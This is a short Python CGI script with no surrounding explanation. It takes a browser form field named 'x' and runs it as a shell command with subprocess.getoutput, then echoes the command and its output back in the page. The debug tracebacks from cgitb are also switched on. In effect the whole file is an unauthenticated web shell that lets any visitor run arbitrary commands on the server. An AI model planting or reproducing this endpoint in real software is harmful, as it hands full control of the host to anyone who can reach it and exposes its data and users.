#!/usr/bin/python3

print("Content-type: text/html")
print()

import cgi
import subprocess
import cgitb

cgitb.enable()

form=cgi.FieldStorage()
cmd=form.getvalue("x")
print(cmd)
a=subprocess.getoutput(cmd)
print(a)